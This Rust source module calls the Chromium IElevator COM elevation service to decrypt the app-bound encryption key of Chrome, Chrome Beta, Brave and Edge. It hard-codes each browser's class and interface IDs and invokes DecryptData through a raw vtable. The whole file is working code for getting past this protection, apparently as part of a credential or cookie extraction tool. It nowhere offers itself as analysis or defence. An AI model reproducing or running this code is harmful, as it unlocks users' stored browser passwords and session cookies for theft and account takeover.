//! IElevator COM interface — supports Chrome, Chrome Beta, Brave, Edge.
//!
//! All Windows COM/Ole calls use raw `extern "system"` to avoid name clashes
//! with the generic windows-crate wrappers.

#![allow(non_snake_case, non_camel_case_types)]

use std::ffi::c_void;

// ── GUID ──────────────────────────────────────────────────────────────────────

#[repr(C)]
#[derive(Clone, Copy, Debug)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

// ── Browser configs ───────────────────────────────────────────────────────────

/// One browser's COM class + interface pair.
pub struct BrowserCom {
    pub name: &'static str,
    /// Registry CLSID for the elevation service
    pub clsid: GUID,
    /// Interface IIDs to try in order (newest first)
    pub iids: &'static [GUID],
    /// Expected subfolder under %LOCALAPPDATA% for User Data
    pub user_data_rel: &'static str,
}

static BROWSERS: &[BrowserCom] = &[
    BrowserCom {
        name: "Chrome",
        clsid: GUID { data1: 0x708860E0, data2: 0xF641, data3: 0x4611, data4: [0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B] },
        iids: &[
            // v2 (Chrome 144+)
            GUID { data1: 0x1BF5208B, data2: 0x295F, data3: 0x4992, data4: [0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38] },
            // v1 (Chrome ≤143)
            GUID { data1: 0x463ABECF, data2: 0x410D, data3: 0x407F, data4: [0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8] },
        ],
        user_data_rel: r"Google\Chrome\User Data",
    },
    BrowserCom {
        name: "Chrome Beta",
        clsid: GUID { data1: 0xDD2646BA, data2: 0x3707, data3: 0x4BF8, data4: [0xB9,0xA7,0x03,0x86,0x91,0xA6,0x8F,0xC2] },
        iids: &[
            // v2
            GUID { data1: 0xB96A14B8, data2: 0xD0B0, data3: 0x44D8, data4: [0xBA,0x68,0x23,0x85,0xB2,0xA0,0x32,0x54] },
            // v1
            GUID { data1: 0xA2721D66, data2: 0x376E, data3: 0x4D2F, data4: [0x9F,0x0F,0x90,0x70,0xE9,0xA4,0x2B,0x5F] },
        ],
        user_data_rel: r"Google\Chrome Beta\User Data",
    },
    BrowserCom {
        name: "Brave",
        clsid: GUID { data1: 0x576B31AF, data2: 0x6369, data3: 0x4B6B, data4: [0x85,0x60,0xE4,0xB2,0x03,0xA9,0x7A,0x8B] },
        iids: &[
            GUID { data1: 0xF396861E, data2: 0x0C8E, data3: 0x4C71, data4: [0x82,0x56,0x2F,0xAE,0x6D,0x75,0x9C,0xE9] },
        ],
        user_data_rel: r"BraveSoftware\Brave-Browser\User Data",
    },
    BrowserCom {
        name: "Edge",
        clsid: GUID { data1: 0x1FCBE96C, data2: 0x1697, data3: 0x43AF, data4: [0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67] },
        iids: &[
            // v2
            GUID { data1: 0x8F7B6792, data2: 0x784D, data3: 0x4047, data4: [0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05] },
            // v1
            GUID { data1: 0xC9C2B807, data2: 0x7731, data3: 0x4F34, data4: [0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B] },
        ],
        user_data_rel: r"Microsoft\Edge\User Data",
    },
];

pub fn all_browsers() -> &'static [BrowserCom] {
    BROWSERS
}

// ── Raw Windows API ───────────────────────────────────────────────────────────

extern "system" {
    fn CoInitializeEx(pv: *const c_void, co_init: u32) -> i32;
    fn CoUninitialize();
    fn CoCreateInstance(
        rclsid: *const GUID, punk_outer: *const c_void, ctx: u32,
        riid: *const GUID, ppv: *mut *mut c_void,
    ) -> i32;
    fn CoSetProxyBlanket(
        proxy: *mut c_void, authn: u32, authz: u32, princ: *const u16,
        authn_lvl: u32, imp_lvl: u32, auth_info: *const c_void, caps: u32,
    ) -> i32;
    fn SysAllocStringByteLen(psz: *const i8, len: u32) -> *mut u16;
    fn SysFreeString(bstr: *mut u16);
    fn SysStringByteLen(bstr: *const u16) -> u32;
}

// ── IElevator COM vtable ──────────────────────────────────────────────────────
// vtable[0]: QueryInterface
// vtable[1]: AddRef
// vtable[2]: Release
// vtable[3]: RunRecoveryCRXElevated  (skipped)
// vtable[4]: EncryptData             (skipped)
// vtable[5]: DecryptData             ← called

type FnQI  = unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32;
type FnRef = unsafe extern "system" fn(*mut c_void) -> u32;
type FnRun = unsafe extern "system" fn(*mut c_void,*const u16,*const u16,*const u16,*const u16,u32,*mut usize) -> i32;
type FnEnc = unsafe extern "system" fn(*mut c_void,u32,*mut u16,*mut *mut u16,*mut u32) -> i32;
type FnDec = unsafe extern "system" fn(*mut c_void,*mut u16,*mut *mut u16,*mut u32) -> i32;

#[repr(C)]
struct Vtbl { qi: FnQI, ar: FnRef, rel: FnRef, run: FnRun, enc: FnEnc, dec: FnDec }
#[repr(C)]
struct IElev { vtbl: *const Vtbl }

// ── BSTR helpers ──────────────────────────────────────────────────────────────

struct OwnedBstr(*mut u16);

impl OwnedBstr {
    unsafe fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.is_empty() { return None; }
        let p = SysAllocStringByteLen(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() { None } else { Some(OwnedBstr(p)) }
    }
    fn ptr(&self) -> *mut u16 { self.0 }
}
impl Drop for OwnedBstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { SysFreeString(self.0) };
            self.0 = std::ptr::null_mut();
        }
    }
}

unsafe fn consume_bstr(p: *mut u16) -> Vec<u8> {
    if p.is_null() { return Vec::new(); }
    let len = SysStringByteLen(p) as usize;
    let bytes = std::slice::from_raw_parts(p as *const u8, len).to_vec();
    SysFreeString(p);
    bytes
}

// ── Core decryption ───────────────────────────────────────────────────────────

/// Try all browsers and IIDs until one succeeds.
pub fn decrypt_app_bound_key(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(std::ptr::null(), 0x2);
        if hr < 0 && hr != 0x0000_0001u32 as i32 /* S_FALSE */ {
            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
        }

        let result = try_all_browsers(encrypted_key);
        CoUninitialize();
        result
    }
}

/// Try each browser COM config; called inside try_decrypt.
pub fn decrypt_for_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(std::ptr::null(), 0x2);
        if hr < 0 && hr != 0x0000_0001u32 as i32 {
            return Err(format!("CoInitializeEx: 0x{hr:08X}"));
        }
        let r = try_browser(browser, encrypted_key);
        CoUninitialize();
        r
    }
}

unsafe fn try_all_browsers(encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no browser tried");
    for b in BROWSERS {
        match try_browser(b, encrypted_key) {
            Ok(key) => return Ok(key),
            Err(e) => last = format!("{}: {e}", b.name),
        }
    }
    Err(format!("all browsers failed; last: {last}"))
}

unsafe fn try_browser(browser: &BrowserCom, encrypted_key: &[u8]) -> Result<Vec<u8>, String> {
    let mut last = String::from("no IID tried");
    for iid in browser.iids {
        match try_one(encrypted_key, &browser.clsid, iid) {
            Ok(key) => return Ok(key),
            Err(e) => last = e,
        }
    }
    Err(format!("{} failed; last: {last}", browser.name))
}

unsafe fn try_one(enc: &[u8], clsid: &GUID, iid: &GUID) -> Result<Vec<u8>, String> {
    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = CoCreateInstance(clsid, std::ptr::null(), 0x4, iid, &mut punk);
    if hr < 0 { return Err(format!("CoCreateInstance 0x{hr:08X}")); }
    if punk.is_null() { return Err("null COM pointer".into()); }

    let hr_pb = CoSetProxyBlanket(punk, 0xFFFF_FFFF, 0, std::ptr::null(), 6, 3, std::ptr::null(), 0x40);
    if hr_pb < 0 { eprintln!("[~] CoSetProxyBlanket 0x{hr_pb:08X}"); }

    let cipher = OwnedBstr::from_bytes(enc).ok_or("SysAllocStringByteLen null")?;
    let mut plain: *mut u16 = std::ptr::null_mut();
    let mut last_err: u32 = 0;

    let elev = punk as *mut IElev;
    let hr_d = ((*(*elev).vtbl).dec)(punk, cipher.ptr(), &mut plain, &mut last_err);
    ((*(*elev).vtbl).rel)(punk);

    if hr_d < 0 {
        return Err(format!("DecryptData 0x{hr_d:08X} last_error={last_err}"));
    }
    let bytes = consume_bstr(plain);
    if bytes.is_empty() { return Err("empty decrypted key".into()); }
    Ok(bytes)
}
